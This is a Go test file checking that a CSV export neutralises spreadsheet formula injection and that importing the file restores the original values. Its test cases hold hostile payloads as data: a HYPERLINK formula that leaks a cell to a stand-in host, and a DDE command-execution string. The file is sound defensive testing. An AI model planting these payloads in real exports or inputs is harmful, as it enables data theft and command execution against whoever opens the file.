package handlers

import (
	"bytes"
	"encoding/csv"
	"reflect"
	"testing"

	"github.com/kilaslab/kilas-flow/internal/datastore"
)

// csvTestColumns is the schema the export tests render against: one column per
// branch of csvExportCell, so the neutralisation rule is exercised on a string,
// a number, a boolean and a date at once.
func csvTestColumns() []datastore.ColumnDef {
	return []datastore.ColumnDef{
		{Name: "note", Type: datastore.ColumnString},
		{Name: "count", Type: datastore.ColumnNumber},
		{Name: "flag", Type: datastore.ColumnBoolean},
	}
}

// csvTestBody writes records the way ExportRows does — through encoding/csv —
// so the test reads the same bytes a download would.
func csvTestBody(t *testing.T, records [][]string) []byte {
	t.Helper()

	var buffer bytes.Buffer
	writer := csv.NewWriter(&buffer)
	for _, record := range records {
		if err := writer.Write(record); err != nil {
			t.Fatalf("write record %q: %v", record, err)
		}
	}
	writer.Flush()
	if err := writer.Error(); err != nil {
		t.Fatalf("flush csv: %v", err)
	}
	return buffer.Bytes()
}

func TestCSVExportNeutralisesFormulaCells(t *testing.T) {
	t.Parallel()

	header := []string{"note", "count", "flag"}
	cases := []struct {
		name  string
		value any
		want  string
	}{
		// The finding's own payloads: webhook input that would be an active
		// formula the moment an operator opens the export.
		{"leading equals", `=HYPERLINK("http://evil.test/"&A1,"click")`, `'=HYPERLINK("http://evil.test/"&A1,"click")`},
		{"command execution", `+cmd|'/C calc'!A0`, `'+cmd|'/C calc'!A0`},
		{"leading at", "@SUM(1+1)", "'@SUM(1+1)"},
		{"leading tab", "\t=1+1", "'\t=1+1"},
		{"leading carriage return", "\r=1+1", "'\r=1+1"},
		{"negative number", float64(-5), "'-5"},
		// Untouched: ordinary text, a formula character that is not first, and a
		// value that merely wears a quote.
		{"ordinary text", "hello", "hello"},
		{"equals mid-string", "a=b", "a=b"},
		{"quoted text", "'quoted", "'quoted"},
		{"empty", "", ""},
		{"true", true, "true"},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()

			record := csvExportRecord(header, datastore.Row{"note": testCase.value})
			if got := record[0]; got != testCase.want {
				t.Errorf("exported %q as %q, want %q", testCase.value, got, testCase.want)
			}
		})
	}
}

// The mitigation is only acceptable because the export stays importable: a file
// that has been round-tripped must hold exactly the values it started with,
// including the ones the escaping touched and the one that already began with a
// quote.
func TestCSVExportRoundTripRestoresTheStoredValue(t *testing.T) {
	t.Parallel()

	header := []string{"note", "count", "flag"}
	rows := []datastore.Row{
		{"note": "=1+1", "count": float64(-5), "flag": true},
		{"note": "+cmd|'/C calc'!A0", "count": float64(3), "flag": false},
		{"note": "'=1+1", "count": float64(0), "flag": true},
		{"note": "a=b", "count": float64(1.5), "flag": false},
	}

	records := make([][]string, 0, len(rows)+1)
	records = append(records, header)
	for _, row := range rows {
		records = append(records, csvExportRecord(header, row))
	}

	decoded, skipped, failed, err := decodeCSVImport(csvTestBody(t, records), csvTestColumns(), 1<<20)
	if err != nil {
		t.Fatalf("import the exported file: %v", err)
	}
	if skipped != 0 || len(failed) != 0 {
		t.Fatalf("import reported skipped=%d failed=%v, want a clean file", skipped, failed)
	}
	if len(decoded) != len(rows) {
		t.Fatalf("imported %d rows, want %d", len(decoded), len(rows))
	}
	for index, row := range rows {
		// Compared as a plain map: datastore.Row is a named map type, and
		// DeepEqual on two distinct types is false however equal the contents.
		if !reflect.DeepEqual(decoded[index].values, map[string]any(row)) {
			t.Errorf("row %d round-tripped to %v, want %v", index, decoded[index].values, row)
		}
	}
}

// A negative number is the case where the escaping would break the file rather
// than the value: "'-5" is not a number, so an export that was not undone on
// import would have every negative row refused. The strip therefore has to run
// before the column's own parse, not only for string columns.
func TestCSVImportAcceptsNeutralisedNumericCells(t *testing.T) {
	t.Parallel()

	body := csvTestBody(t, [][]string{
		{"note", "count", "flag"},
		{"'-5", "'-1.5", "true"},
		{"'=1+1", "'+2", "false"},
	})
	decoded, _, failed, err := decodeCSVImport(body, csvTestColumns(), 1<<20)
	if err != nil {
		t.Fatalf("decode: %v", err)
	}
	if len(failed) != 0 {
		t.Fatalf("failed = %v, want the neutralised spellings accepted", failed)
	}
	want := []map[string]any{
		{"note": "-5", "count": float64(-1.5), "flag": true},
		{"note": "=1+1", "count": float64(2), "flag": false},
	}
	for index, expected := range want {
		if !reflect.DeepEqual(decoded[index].values, expected) {
			t.Errorf("row %d = %v, want %v", index, decoded[index].values, expected)
		}
	}
}
